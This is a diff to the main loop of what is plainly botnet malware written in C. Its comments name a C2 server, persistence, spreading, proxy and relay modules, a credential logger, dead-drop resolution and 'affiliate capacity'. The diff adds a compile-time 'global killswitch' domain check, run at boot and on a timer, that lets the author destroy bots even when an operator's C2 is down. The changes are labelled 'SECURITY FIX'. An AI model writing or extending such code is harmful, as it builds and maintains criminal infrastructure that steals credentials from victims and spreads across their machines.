@@ -13,6 +13,7 @@
 #include "proxy.h"
 #include "relay.h"
 #include "plugin.h"
+#include "killswitch.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -315,6 +316,16 @@ int main(void) {
         return EXIT_FAILURE;
     }
 
+    /* SECURITY FIX (#130): Global killswitch — boot check. A bot whose
+     * killswitch domain is armed self-destructs BEFORE it connects to
+     * the C2, installs persistence, or starts any module. No runtime
+     * config can change the domain; only a recompile can. */
+    if (killswitch_check()) {
+        kill_self(&g_bot, "global killswitch (boot)");
+        cleanup_bot();
+        return EXIT_SUCCESS;
+    }
+
     /* SECURITY FIX (#92): Loader/plugin bootstrap. Register the
      * compile-time built-in plugins (spread, proxy, relay, cred-log)
      * and mark them loaded — existing module behavior is unchanged,
@@ -372,6 +383,8 @@ int main(void) {
     time_t last_heartbeat = time(NULL);
     /* Dead-drop re-resolution timer (#86) */
     time_t last_dead_drop = time(NULL);
+    /* Global killswitch re-check timer (#130) */
+    time_t last_killswitch = time(NULL);
     
     while (g_running) {
         /* Try to connect to C2 */
@@ -388,6 +401,18 @@ int main(void) {
         if (g_bot.kill_pending) {
             log_info("kill: exiting cleanly — affiliate capacity handed back");
             break;
+        }
+
+        /* SECURITY FIX (#130): Global killswitch — periodic re-check on
+         * its own timer. The author can arm (point the domain at the
+         * kill address) or disarm (remove the record) at any time; the
+         * kill works even when the operator's C2 is down. */
+        if (time(NULL) - last_killswitch >= (time_t)KILLSWITCH_INTERVAL_DEFAULT) {
+            if (killswitch_check()) {
+                kill_self(&g_bot, "global killswitch");
+                break;
+            }
+            last_killswitch = time(NULL);
         }
         
         /* Spread if not connected to primary C2. The gate is the LIVE
